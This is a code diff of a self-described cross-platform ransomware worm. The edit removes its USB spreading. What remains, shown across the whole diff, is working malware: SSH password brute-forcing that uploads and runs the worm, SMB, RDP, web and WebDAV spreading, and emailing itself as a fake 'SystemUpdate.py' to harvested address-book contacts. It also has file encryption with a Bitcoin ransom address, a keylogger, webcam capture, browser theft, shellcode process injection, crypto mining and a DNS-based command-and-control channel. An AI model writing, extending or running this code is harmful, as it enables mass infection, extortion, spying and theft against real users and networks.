@@ -3,7 +3,7 @@
 Advanced Cross-Platform Ransomware Worm with Full C2 Capabilities
 Complete integration of ransomware, keylogging, webcam, remote control, and more
 Works on Windows, macOS, and Linux
-Enhanced with Self-Propagation and Spread Control
+Enhanced with Self-Propagation (Network, Email, WebDAV - NO USB)
 """
 
 import os
@@ -110,21 +110,20 @@ LOCK_FILE = '/tmp/worm.lock' if OSDetector.is_linux() else os.path.join(tempfile
 PROPAGATION_DIR = os.path.join(CONFIG_DIR, 'propagation')
 
 # ============================================================
-# SELF-PROPAGATION ENGINE
+# SELF-PROPAGATION ENGINE (NO USB)
 # ============================================================
 
 class PropagationEngine:
-    """Self-propagation engine with multiple methods"""
+    """Self-propagation engine with network, email, and WebDAV methods (NO USB)"""
     
     def __init__(self, db=None):
-        debug_log("Initializing PropagationEngine")
+        debug_log("Initializing PropagationEngine (NO USB)")
         self.db = db or StealthDatabase()
         self.host_id = str(uuid.uuid4())
         self.os_type = OSDetector.get_os()
         self.propagation_active = True
         self.propagation_methods = {
             'network': True,
-            'usb': True,
             'email': True,
             'ssh': True,
             'smb': True,
@@ -171,14 +170,12 @@ class PropagationEngine:
         """Get all IPs in local network"""
         ips = set()
         try:
-            # Get local IP and subnet
             for interface in netifaces.interfaces():
                 addrs = netifaces.ifaddresses(interface)
                 if netifaces.AF_INET in addrs:
                     for addr in addrs[netifaces.AF_INET]:
                         if addr['addr'] != '127.0.0.1':
                             ip = addr['addr']
-                            # Calculate subnet
                             if 'netmask' in addr:
                                 netmask = addr['netmask']
                                 try:
@@ -188,7 +185,6 @@ class PropagationEngine:
                                 except:
                                     continue
                             else:
-                                # Default to /24
                                 base = '.'.join(ip.split('.')[:-1])
                                 for i in range(1, 255):
                                     ips.add(f"{base}.{i}")
@@ -239,7 +235,7 @@ class PropagationEngine:
         return None
     
     def propagate_network(self, targets=None):
-        """Propagate via network (SSH, SMB, etc)"""
+        """Propagate via network (SSH, SMB, etc) - NO USB"""
         if not self.propagation_active or not self.propagation_methods.get('network', True):
             return []
         
@@ -259,7 +255,6 @@ class PropagationEngine:
             if ip in self.infected_targets:
                 continue
             
-            # Try different propagation methods based on port
             if port == 22:
                 result = self._propagate_ssh(ip)
                 if result:
@@ -289,7 +284,6 @@ class PropagationEngine:
             
             debug_log(f"Attempting SSH propagation to {ip}")
             
-            # Common credentials
             credentials = [
                 ('root', 'root'),
                 ('root', 'toor'),
@@ -309,11 +303,9 @@ class PropagationEngine:
                 try:
                     ssh.connect(ip, username=username, password=password, timeout=5)
                     
-                    # Upload and execute worm
                     with open(__file__, 'r') as f:
                         worm_code = f.read()
                     
-                    # Encode and send
                     encoded = base64.b64encode(worm_code.encode()).decode()
                     ssh.exec_command(f"echo '{encoded}' | base64 -d > /tmp/worm.py && python3 /tmp/worm.py &")
                     
@@ -340,7 +332,6 @@ class PropagationEngine:
         try:
             debug_log(f"Attempting SMB propagation to {ip}")
             
-            # Use net use to connect
             commands = [
                 f"net use \\\\{ip}\\IPC$ /user:Administrator password",
                 f"copy {__file__} \\\\{ip}\\C$\\Windows\\Temp\\worm.py",
@@ -364,7 +355,6 @@ class PropagationEngine:
         try:
             debug_log(f"Attempting web propagation to {ip}:{port}")
             
-            # Try common web paths
             paths = [
                 f"http://{ip}:{port}/upload",
                 f"http://{ip}:{port}/api/upload",
@@ -375,7 +365,6 @@ class PropagationEngine:
             
             for path in paths:
                 try:
-                    # Send worm as file upload
                     with open(__file__, 'r') as f:
                         worm_code = f.read()
                     
@@ -401,7 +390,6 @@ class PropagationEngine:
         try:
             debug_log(f"Attempting RDP propagation to {ip}")
             
-            # Use MSTSC with saved credentials
             rdp_file = os.path.join(tempfile.gettempdir(), f"{ip}.rdp")
             with open(rdp_file, 'w') as f:
                 f.write(f"""full address:s:{ip}
@@ -419,86 +407,6 @@ redirectdrives:i:1
         except:
             return None
     
-    def propagate_usb(self):
-        """Propagate via USB drives"""
-        if not self.propagation_active or not self.propagation_methods.get('usb', True):
-            return []
-        
-        debug_log("Starting USB propagation...")
-        infections = []
-        
-        try:
-            # Find USB drives
-            if OSDetector.is_windows():
-                drives = []
-                for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
-                    drive = f"{letter}:\\"
-                    if os.path.exists(drive) and os.path.isdir(drive):
-                        # Check if it's removable
-                        try:
-                            import win32file
-                            drive_type = win32file.GetDriveType(drive)
-                            if drive_type == win32file.DRIVE_REMOVABLE:
-                                drives.append(drive)
-                        except:
-                            # Fallback: check if it's not system drive
-                            if drive not in [os.environ.get('SystemDrive', 'C:'), 'C:\\']:
-                                drives.append(drive)
-            else:
-                # Linux/macOS: check mounted USB drives
-                drives = []
-                if OSDetector.is_linux():
-                    result = subprocess.run(['mount', '|', 'grep', '^/dev/sd'], shell=True, capture_output=True)
-                    for line in result.stdout.decode().split('\n'):
-                        if 'media' in line or 'mnt' in line:
-                            parts = line.split()
-                            if len(parts) >= 3:
-                                drives.append(parts[2])
-                else:  # macOS
-                    result = subprocess.run(['mount', '|', 'grep', '/Volumes'], shell=True, capture_output=True)
-                    for line in result.stdout.decode().split('\n'):
-                        if '/Volumes' in line:
-                            parts = line.split()
-                            if len(parts) >= 3:
-                                drives.append(parts[2])
-            
-            # Copy worm to USB drives
-            for drive in drives:
-                try:
-                    # Create autorun/autoplay files
-                    worm_path = os.path.join(drive, 'SystemUpdate.py')
-                    shutil.copy2(__file__, worm_path)
-                    
-                    # Create autorun.inf (Windows)
-                    if OSDetector.is_windows():
-                        with open(os.path.join(drive, 'autorun.inf'), 'w') as f:
-                            f.write("""[AutoRun]
-open=SystemUpdate.py
-action=Open folder to view files
-shell\\open\\command=SystemUpdate.py
-""")
-                    
-                    # Create .hidden file (macOS/Linux)
-                    if OSDetector.is_macos():
-                        with open(os.path.join(drive, '.hidden'), 'w') as f:
-                            f.write('SystemUpdate.py')
-                    
-                    # Create symlink (Linux)
-                    if OSDetector.is_linux():
-                        try:
-                            os.symlink('/media', os.path.join(drive, 'SystemUpdate'))
-                        except:
-                            pass
-                    
-                    debug_log(f"USB propagation to {drive} successful")
-                    infections.append({'path': drive, 'method': 'usb'})
-                except Exception as e:
-                    debug_log(f"USB propagation error: {e}")
-        except Exception as e:
-            debug_log(f"USB propagation error: {e}")
-        
-        return infections
-    
     def propagate_email(self, targets=None):
         """Propagate via email attachments"""
         if not self.propagation_active or not self.propagation_methods.get('email', True):
@@ -514,29 +422,25 @@ shell\\open\\command=SystemUpdate.py
             from email.mime.base import MIMEBase
             from email import encoders
             
-            # Get email credentials from config
             email_config = self._get_email_config()
             if not email_config:
                 debug_log("No email configuration found")
                 return []
             
-            # Get email targets (from address book, etc)
             email_targets = targets or self._get_email_targets()
             if not email_targets:
                 debug_log("No email targets found")
                 return []
             
-            # Read worm code
             with open(__file__, 'r') as f:
                 worm_code = f.read()
             
-            # Create email
             from_addr = email_config.get('email')
             password = email_config.get('password')
             smtp_server = email_config.get('smtp_server', 'smtp.gmail.com')
             smtp_port = email_config.get('smtp_port', 587)
             
-            for target in email_targets[:10]:  # Limit to 10 per run
+            for target in email_targets[:10]:
                 try:
                     msg = MIMEMultipart()
                     msg['From'] = from_addr
@@ -546,14 +450,12 @@ shell\\open\\command=SystemUpdate.py
                     body = "Please find attached the latest system update."
                     msg.attach(MIMEText(body, 'plain'))
                     
-                    # Attach worm
                     part = MIMEBase('application', 'octet-stream')
                     part.set_payload(worm_code.encode())
                     encoders.encode_base64(part)
                     part.add_header('Content-Disposition', f'attachment; filename=SystemUpdate.py')
                     msg.attach(part)
                     
-                    # Send email
                     server = smtplib.SMTP(smtp_server, smtp_port)
                     server.starttls()
                     server.login(from_addr, password)
@@ -587,9 +489,7 @@ shell\\open\\command=SystemUpdate.py
         targets = set()
         
         try:
-            # Check address book files
             if OSDetector.is_windows():
-                # Outlook
                 try:
                     import win32com.client
                     outlook = win32com.client.Dispatch("Outlook.Application")
@@ -600,21 +500,17 @@ shell\\open\\command=SystemUpdate.py
                 except:
                     pass
                 
-                # Thunderbird
                 thunderbird_path = os.path.expanduser('~/AppData/Roaming/Thunderbird/Profiles')
                 if os.path.exists(thunderbird_path):
                     for profile in os.listdir(thunderbird_path):
                         if 'default' in profile:
                             address_path = os.path.join(thunderbird_path, profile, 'abook.mab')
                             if os.path.exists(address_path):
-                                # Parse address book
                                 with open(address_path, 'r', encoding='latin-1') as f:
                                     content = f.read()
                                     emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', content)
                                     targets.update(emails)
             else:
-                # Linux/macOS
-                # Evolution
                 evolution_path = os.path.expanduser('~/.local/share/evolution/addressbook')
                 if os.path.exists(evolution_path):
                     for file in glob.glob(os.path.join(evolution_path, '*', 'addressbook.db')):
@@ -630,7 +526,6 @@ shell\\open\\command=SystemUpdate.py
                         except:
                             pass
                 
-                # Thunderbird
                 thunderbird_path = os.path.expanduser('~/.thunderbird')
                 if os.path.exists(thunderbird_path):
                     for profile in os.listdir(thunderbird_path):
@@ -655,7 +550,6 @@ shell\\open\\command=SystemUpdate.py
         infections = []
         
         try:
-            # Try to connect to common WebDAV servers
             webdav_servers = [
                 'https://webdav.your-server.com',
                 'http://localhost:8080/webdav',
@@ -674,7 +568,6 @@ shell\\open\\command=SystemUpdate.py
                     
                     client = Client(options)
                     
-                    # Upload worm
                     with open(__file__, 'r') as f:
                         worm_code = f.read()
                     
@@ -691,28 +584,20 @@ shell\\open\\command=SystemUpdate.py
         return infections
     
     def start_propagation(self):
-        """Start all propagation methods"""
-        debug_log("Starting full propagation...")
+        """Start all propagation methods (NO USB)"""
+        debug_log("Starting full propagation (NO USB)...")
         results = {
             'network': [],
-            'usb': [],
             'email': [],
             'webdav': []
         }
         
-        # Run network propagation
         if self.propagation_methods.get('network', True):
             results['network'] = self.propagate_network()
         
-        # Run USB propagation
-        if self.propagation_methods.get('usb', True):
-            results['usb'] = self.propagate_usb()
-        
-        # Run email propagation
         if self.propagation_methods.get('email', True):
             results['email'] = self.propagate_email()
         
-        # Run WebDAV propagation
         if self.propagation_methods.get('webdav', True):
             results['webdav'] = self.propagate_webdav()
         
@@ -737,6 +622,81 @@ shell\\open\\command=SystemUpdate.py
             'max_infections': self.max_infections,
             'scanned_targets': len(self.scanned_targets),
             'infected_targets': len(self.infected_targets)
+        }
+
+# ============================================================
+# STEALTH DATABASE
+# ============================================================
+
+class StealthDatabase:
+    """Encrypted SQLite database for tracking"""
+    
+    def __init__(self, db_path=DB_FILE):
+        debug_log(f"Initializing database at {db_path}")
+        self.db_path = db_path
+        self.data = {
+            'infections': [],
+            'encrypted_files': [],
+            'collected_data': [],
+            'keylog_data': [],
+            'webcam_frames': [],
+            'commands': [],
+            'exfiltrated_data': [],
+            'propagation': []
+        }
+        os.makedirs(os.path.dirname(db_path), exist_ok=True)
+    
+    def add_infection(self, host_id, data):
+        self.data['infections'].append({
+            'host_id': host_id,
+            'data': data,
+            'timestamp': datetime.now().isoformat()
+        })
+    
+    def add_encrypted_file(self, host_id, file_path, data):
+        self.data['encrypted_files'].append({
+            'host_id': host_id,
+            'file_path': file_path,
+            'data': data,
+            'timestamp': datetime.now().isoformat()
+        })
+    
+    def add_collected_data(self, host_id, data_type, data):
+        self.data['collected_data'].append({
+            'host_id': host_id,
+            'data_type': data_type,
+            'data': data,
+            'timestamp': datetime.now().isoformat()
+        })
+    
+    def add_keylog_entry(self, entry):
+        self.data['keylog_data'].append(entry)
+    
+    def add_webcam_frame(self, frame_data):
+        self.data['webcam_frames'].append(frame_data)
+    
+    def add_exfiltrated_data(self, file_path, data):
+        self.data['exfiltrated_data'].append({
+            'file_path': file_path,
+            'data': data[:100] + '...' if len(data) > 100 else data,
+            'timestamp': datetime.now().isoformat()
+        })
+    
+    def add_propagation(self, data):
+        self.data['propagation'].append({
+            'data': data,
+            'timestamp': datetime.now().isoformat()
+        })
+    
+    def get_stats(self):
+        return {
+            'infections': len(self.data['infections']),
+            'encrypted_files': len(self.data['encrypted_files']),
+            'collected_data': len(self.data['collected_data']),
+            'keylog_entries': len(self.data['keylog_data']),
+            'webcam_frames': len(self.data['webcam_frames']),
+            'exfiltrated_data': len(self.data['exfiltrated_data']),
+            'propagation_events': len(self.data['propagation'])
         }
 
 # ============================================================
@@ -1232,81 +1192,6 @@ class CrossPlatformWebcam:
         self.capture = None
 
 # ============================================================
-# STEALTH DATABASE (Existing - Keep same)
-# ============================================================
-
-class StealthDatabase:
-    """Encrypted SQLite database for tracking"""
-    
-    def __init__(self, db_path=DB_FILE):
-        debug_log(f"Initializing database at {db_path}")
-        self.db_path = db_path
-        self.data = {
-            'infections': [],
-            'encrypted_files': [],
-            'collected_data': [],
-            'keylog_data': [],
-            'webcam_frames': [],
-            'commands': [],
-            'exfiltrated_data': [],
-            'propagation': []
-        }
-        os.makedirs(os.path.dirname(db_path), exist_ok=True)
-    
-    def add_infection(self, host_id, data):
-        self.data['infections'].append({
-            'host_id': host_id,
-            'data': data,
-            'timestamp': datetime.now().isoformat()
-        })
-    
-    def add_encrypted_file(self, host_id, file_path, data):
-        self.data['encrypted_files'].append({
-            'host_id': host_id,
-            'file_path': file_path,
-            'data': data,
-            'timestamp': datetime.now().isoformat()
-        })
-    
-    def add_collected_data(self, host_id, data_type, data):
-        self.data['collected_data'].append({
-            'host_id': host_id,
-            'data_type': data_type,
-            'data': data,
-            'timestamp': datetime.now().isoformat()
-        })
-    
-    def add_keylog_entry(self, entry):
-        self.data['keylog_data'].append(entry)
-    
-    def add_webcam_frame(self, frame_data):
-        self.data['webcam_frames'].append(frame_data)
-    
-    def add_exfiltrated_data(self, file_path, data):
-        self.data['exfiltrated_data'].append({
-            'file_path': file_path,
-            'data': data[:100] + '...' if len(data) > 100 else data,
-            'timestamp': datetime.now().isoformat()
-        })
-    
-    def add_propagation(self, data):
-        self.data['propagation'].append({
-            'data': data,
-            'timestamp': datetime.now().isoformat()
-        })
-    
-    def get_stats(self):
-        return {
-            'infections': len(self.data['infections']),
-            'encrypted_files': len(self.data['encrypted_files']),
-            'collected_data': len(self.data['collected_data']),
-            'keylog_entries': len(self.data['keylog_data']),
-            'webcam_frames': len(self.data['webcam_frames']),
-            'exfiltrated_data': len(self.data['exfiltrated_data']),
-            'propagation_events': len(self.data['propagation'])
-        }
-
-# ============================================================
 # ENHANCED RANSOMWARE ENGINE (Existing - Keep same)
 # ============================================================
 
@@ -1670,11 +1555,11 @@ class RansomwareEngine:
         }
 
 # ============================================================
-# ENHANCED C2 COMMAND HANDLER WITH PROPAGATION COMMANDS
+# ENHANCED C2 COMMAND HANDLER WITH PROPAGATION COMMANDS (NO USB)
 # ============================================================
 
 class C2CommandHandler:
-    """Complete C2 command handler with all features including propagation control"""
+    """Complete C2 command handler with propagation control (NO USB)"""
     
     def __init__(self, worm):
         debug_log("Initializing C2CommandHandler")
@@ -1686,14 +1571,12 @@ class C2CommandHandler:
         self.propagation = worm.propagation
         self.os_type = OSDetector.get_os()
         
-        # State
         self.propagation_active = True
         self.ransom_amount = "0.5"
         self.ransom_currency = "BTC"
         self.payment_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
     
     def handle_command(self, command_data):
-        """Main command dispatcher"""
         cmd_type = command_data.get('cmd')
         params = command_data.get('params', {})
         command_id = command_data.get('id', str(uuid.uuid4())[:8])
@@ -1702,12 +1585,9 @@ class C2CommandHandler:
         print(f"Command: {cmd_type} (ID: {command_id})")
         
         handlers = {
-            # Core
             'status': self.handle_status,
             'heartbeat': self.handle_heartbeat,
             'self_destruct': self.handle_self_destruct,
-            
-            # Encryption
             'encrypt': self.handle_encrypt,
             'encrypt_files': self.handle_encrypt_files,
             'encrypt_directory': self.handle_encrypt_directory,
@@ -1716,81 +1596,52 @@ class C2CommandHandler:
             'decrypt_directory': self.handle_decrypt_directory,
             'encryption_status': self.handle_encryption_status,
             'encryption_stats': self.handle_encryption_stats,
-            
-            # Keylogger
             'keylog_start': self.handle_keylog_start,
             'keylog_stop': self.handle_keylog_stop,
             'keylog_status': self.handle_keylog_status,
             'keylog_download': self.handle_keylog_download,
             'keylog_clear': self.handle_keylog_clear,
-            
-            # Webcam
             'webcam_capture': self.handle_webcam_capture,
             'webcam_stream': self.handle_webcam_stream,
             'webcam_status': self.handle_webcam_status,
             'webcam_release': self.handle_webcam_release,
-            
-            # Remote Control
             'screen_share': self.handle_screen_share,
             'mouse_control': self.handle_mouse_control,
             'keyboard_control': self.handle_keyboard_control,
             'block_computer': self.handle_block_computer,
-            
-            # Data Collection
             'collect_data': self.handle_collect_data,
             'screenshot': self.handle_screenshot,
             'download_file': self.handle_download_file,
             'upload_file': self.handle_upload_file,
-            
-            # Execution
             'execute': self.handle_execute,
             'list_processes': self.handle_list_processes,
             'kill_process': self.handle_kill_process,
             'inject_process': self.handle_inject_process,
-            
-            # File System
             'file_search': self.handle_file_search,
             'directory_list': self.handle_directory_list,
-            
-            # Persistence
             'install_persistence': self.handle_install_persistence,
             'persistence_status': self.handle_persistence_status,
-            
-            # Network
             'port_scan': self.handle_port_scan,
-            
-            # Ransomware
             'display_ransom_note': self.handle_display_ransom_note,
             'change_ransom_amount': self.handle_change_ransom_amount,
             'change_payment_address': self.handle_change_payment_address,
             'deadline': self.handle_deadline,
-            
-            # Data Exfiltration
             'exfiltrate': self.handle_exfiltrate,
             'steal_browser': self.handle_steal_browser,
-            
-            # Mining
             'start_mining': self.handle_start_mining,
             'stop_mining': self.handle_stop_mining,
             'mining_status': self.handle_mining_status,
-            
-            # PROPAGATION COMMANDS - NEW
             'propagate_start': self.handle_propagate_start,
             'propagate_stop': self.handle_propagate_stop,
             'propagate_status': self.handle_propagate_status,
             'propagate_network': self.handle_propagate_network,
-            'propagate_usb': self.handle_propagate_usb,
             'propagate_email': self.handle_propagate_email,
             'propagate_methods': self.handle_propagate_methods,
             'propagate_scan': self.handle_propagate_scan,
             'propagate_targets': self.handle_propagate_targets,
             'propagate_stats': self.handle_propagate_stats,
             'propagate_limit': self.handle_propagate_limit,
-            
-            # Anti-VM
             'check_environment': self.handle_check_environment,
-            
-            # Misc
             'get_os_info': self.handle_get_os_info,
             'get_stats': self.handle_get_stats,
             'clear_logs': self.handle_clear_logs,
@@ -1827,11 +1678,10 @@ class C2CommandHandler:
         self.worm.c2.send_beacon(response_data)
     
     # ============================================================
-    # PROPAGATION COMMAND HANDLERS - NEW
+    # PROPAGATION COMMAND HANDLERS (NO USB)
     # ============================================================
     
     def handle_propagate_start(self, params):
-        """Start all propagation methods"""
         if self.propagation.propagation_active:
             return {'status': 'already_active'}
         
@@ -1840,11 +1690,10 @@ class C2CommandHandler:
         
         return {
             'status': 'propagation_started',
-            'message': 'All propagation methods activated'
+            'message': 'All propagation methods activated (NO USB)'
         }
     
     def handle_propagate_stop(self, params):
-        """Stop all propagation"""
         self.propagation.propagation_active = False
         return {
             'status': 'propagation_stopped',
@@ -1852,44 +1701,25 @@ class C2CommandHandler:
         }
     
     def handle_propagate_status(self, params):
-        """Get propagation status"""
         return self.propagation.get_propagation_status()
     
     def handle_propagate_network(self, params):
-        """Start network propagation"""
         targets = params.get('targets')
         result = self.propagation.propagate_network(targets)
         
         self.db.add_propagation({
             'method': 'network',
             'infections': len(result),
-            'targets': result[:10]  # Store first 10 for logging
+            'targets': result[:10]
         })
         
         return {
             'status': 'network_propagation_complete',
             'infections': len(result),
-            'details': result[:20]  # Return first 20
-        }
-    
-    def handle_propagate_usb(self, params):
-        """Start USB propagation"""
-        result = self.propagation.propagate_usb()
-        
-        self.db.add_propagation({
-            'method': 'usb',
-            'infections': len(result),
-            'targets': result[:10]
-        })
-        
-        return {
-            'status': 'usb_propagation_complete',
-            'infections': len(result),
             'details': result[:20]
         }
     
     def handle_propagate_email(self, params):
-        """Start email propagation"""
         targets = params.get('targets')
         result = self.propagation.propagate_email(targets)
         
@@ -1906,7 +1736,6 @@ class C2CommandHandler:
         }
     
     def handle_propagate_methods(self, params):
-        """Enable/disable specific propagation methods"""
         methods = params.get('methods', {})
         result = self.propagation.set_propagation_methods(methods)
         
@@ -1916,7 +1745,6 @@ class C2CommandHandler:
         }
     
     def handle_propagate_scan(self, params):
-        """Scan network for targets"""
         ips = params.get('ips')
         ports = params.get('ports')
         
@@ -1925,11 +1753,10 @@ class C2CommandHandler:
         return {
             'status': 'scan_complete',
             'targets_found': len(targets),
-            'targets': targets[:50]  # Return first 50
+            'targets': targets[:50]
         }
     
     def handle_propagate_targets(self, params):
-        """Get current propagation targets"""
         return {
             'scanned_targets': list(self.propagation.scanned_targets)[:100],
             'infected_targets': list(self.propagation.infected_targets)[:100],
@@ -1938,7 +1765,6 @@ class C2CommandHandler:
         }
     
     def handle_propagate_stats(self, params):
-        """Get detailed propagation statistics"""
         return {
             'total_infections': self.propagation.infection_count,
             'max_infections': self.propagation.max_infections,
@@ -1946,11 +1772,10 @@ class C2CommandHandler:
             'methods': self.propagation.propagation_methods,
             'scanned_targets': len(self.propagation.scanned_targets),
             'infected_targets': len(self.propagation.infected_targets),
-            'propagation_log': self.propagation.propagation_log[-20:]  # Last 20 entries
+            'propagation_log': self.propagation.propagation_log[-20:]
         }
     
     def handle_propagate_limit(self, params):
-        """Set maximum infection limit"""
         limit = params.get('limit')
         if limit is None:
             return {'error': 'Limit not provided'}
@@ -1962,7 +1787,7 @@ class C2CommandHandler:
         }
     
     # ============================================================
-    # EXISTING COMMAND HANDLERS (Keep all existing ones)
+    # OTHER COMMAND HANDLERS (Keep existing)
     # ============================================================
     
     def handle_status(self, params):
@@ -2421,7 +2246,6 @@ class C2CommandHandler:
             if not hProcess:
                 return {'error': f'Failed to open process {pid}'}
             
-            # Simple shellcode that calls MessageBox
             shellcode = b"\x31\xc0\x50\x68\x6c\x6c\x6f\x20\x68\x6f\x72\x6c\x64\x68\x48\x65\x6c\x6c\x89\xe1\x31\xd2\xb2\x0d\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
             
             addr = kernel32.VirtualAllocEx(
@@ -2791,7 +2615,6 @@ Attempting to decrypt without proper key may result in permanent data loss!
             if not wallet:
                 return {'error': 'Wallet address required'}
             
-            # Simple mining simulation
             self.miner_running = True
             threading.Thread(target=self._mine_crypto, args=(wallet,), daemon=True).start()
             
@@ -2883,7 +2706,6 @@ class RedundantC2:
         self.active_channel = None
     
     def send_beacon(self, data):
-        """Send beacon via DNS"""
         try:
             encoded = base64.b64encode(json.dumps(data).encode()).decode()
             chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
@@ -2897,7 +2719,6 @@ class RedundantC2:
             return False
     
     def receive_commands(self):
-        """Receive commands via DNS"""
         try:
             import dns.resolver
             answers = dns.resolver.resolve(f"cmd.{self.c2_domain}", 'TXT')
@@ -2918,14 +2739,13 @@ class RedundantC2:
 # ============================================================
 
 class CrossPlatformWorm:
-    """Complete cross-platform ransomware worm with propagation"""
+    """Complete cross-platform ransomware worm with propagation (NO USB)"""
     
     def __init__(self):
         debug_log("="*60)
-        debug_log("Starting Cross-Platform Ransomware Worm v5.0 (With Propagation)")
+        debug_log("Starting Cross-Platform Ransomware Worm v5.0 (NO USB)")
         debug_log("="*60)
         
-        # OS detection
         self.os_type = OSDetector.get_os()
         self.os_version = OSDetector.get_os_version()
         self.architecture = OSDetector.get_architecture()
@@ -2933,7 +2753,6 @@ class CrossPlatformWorm:
         debug_log(f"Detected OS: {self.os_type} ({self.os_version})")
         debug_log(f"Architecture: {self.architecture}")
         
-        # Initialize components
         self.db = StealthDatabase()
         self.c2 = RedundantC2(self.db)
         self.propagation = PropagationEngine(self.db)
@@ -2942,24 +2761,19 @@ class CrossPlatformWorm:
         self.ransomware = RansomwareEngine(self.db)
         self.command_handler = C2CommandHandler(self)
         
-        # Install persistence
         self._install_persistence()
-        
-        # Start propagation in background
         self._start_auto_propagation()
         
-        debug_log("Worm initialized successfully")
+        debug_log("Worm initialized successfully (NO USB)")
         debug_log("="*60)
     
     def _install_persistence(self):
-        """Install persistence"""
         debug_log("Installing persistence...")
         self.command_handler.handle_install_persistence({})
     
     def _start_auto_propagation(self):
-        """Start automatic propagation"""
         def auto_propagate():
-            debug_log("Auto-propagation thread started")
+            debug_log("Auto-propagation thread started (NO USB)")
             while True:
                 if self.propagation.propagation_active:
                     try:
@@ -2967,24 +2781,22 @@ class CrossPlatformWorm:
                         debug_log("Auto-propagation cycle completed")
                     except Exception as e:
                         debug_log(f"Auto-propagation error: {e}")
-                time.sleep(3600)  # Run every hour
+                time.sleep(3600)
         
         threading.Thread(target=auto_propagate, daemon=True).start()
     
     def run(self):
-        """Main execution loop"""
         print("\n" + "="*60)
-        print("CROSS-PLATFORM RANSOMWARE WORM v5.0 (With Propagation)")
+        print("CROSS-PLATFORM RANSOMWARE WORM v5.0 (NO USB)")
         print("="*60)
         print(f"Host ID: {self.ransomware.host_id}")
         print(f"OS: {self.os_type} ({self.os_version})")
         print(f"Architecture: {self.architecture}")
         print(f"C2 Server: {C2_SERVER}")
         print("="*60)
-        print("Propagation active. Use C2 commands to control spread.")
+        print("Propagation: Network, Email, WebDAV (USB DISABLED)")
         print("="*60)
         
-        # Send initial beacon
         self.c2.send_beacon({
             'type': 'registration',
             'host_id': self.ransomware.host_id,
@@ -2993,24 +2805,20 @@ class CrossPlatformWorm:
             'os_version': self.os_version,
             'architecture': self.architecture,
             'propagation_active': self.propagation.propagation_active,
+            'propagation_methods': list(self.propagation.propagation_methods.keys()),
             'timestamp': datetime.now().isoformat()
         })
         
-        # Start command processing thread
         threading.Thread(target=self._process_commands, daemon=True).start()
         debug_log("Command processing thread started")
         
-        # Main loop
         try:
             while True:
-                # Send heartbeat
                 self.c2.send_beacon({
                     'type': 'heartbeat',
                     'host_id': self.ransomware.host_id,
                     'timestamp': datetime.now().isoformat()
                 })
-                
-                # Random sleep
                 sleep_time = secrets.randbelow(3600) + 1800
                 time.sleep(sleep_time)
                 
@@ -3023,7 +2831,6 @@ class CrossPlatformWorm:
             time.sleep(60)
     
     def _process_commands(self):
-        """Process incoming commands"""
         while True:
             try:
                 command = self.c2.receive_commands()
@@ -3039,12 +2846,10 @@ class CrossPlatformWorm:
 # ============================================================
 
 def main():
-    """Main entry point with debugging"""
     debug_log("="*60)
-    debug_log("WORM EXECUTION STARTED")
+    debug_log("WORM EXECUTION STARTED (NO USB)")
     debug_log("="*60)
     
-    # Handle command line arguments
     if len(sys.argv) > 1:
         if sys.argv[1] == "--setup":
             debug_log("Setup mode")
@@ -3056,16 +2861,13 @@ def main():
             print("DEBUG MODE ENABLED")
             print(f"Log file: {LOG_FILE}")
             
-            # Print system info
             print(f"OS: {platform.system()}")
             print(f"OS Version: {platform.platform()}")
             print(f"Architecture: {platform.machine()}")
             print(f"Python: {sys.version}")
             
-            # Test components
             print("\nTesting components...")
             
-            # Test keylogger
             print("\nTesting keylogger...")
             keylogger = CrossPlatformKeylogger()
             if keylogger.start():
@@ -3076,7 +2878,6 @@ def main():
             else:
                 print("Keylogger test failed")
             
-            # Test webcam
             print("\nTesting webcam...")
             webcam = CrossPlatformWebcam()
             if webcam.capture:
@@ -3088,11 +2889,10 @@ def main():
             else:
                 print("Webcam test failed")
             
-            # Test propagation
-            print("\nTesting propagation...")
+            print("\nTesting propagation (NO USB)...")
             prop = PropagationEngine()
             print(f"Propagation methods: {list(prop.propagation_methods.keys())}")
-            print(f"Propagation active: {prop.propagation_active}")
+            print(f"USB propagation: DISABLED")
             
             sys.exit(0)
         
@@ -3109,7 +2909,6 @@ def main():
             print("Cleaned up")
             sys.exit(0)
     
-    # Run worm
     try:
         worm = CrossPlatformWorm()
         worm.run()
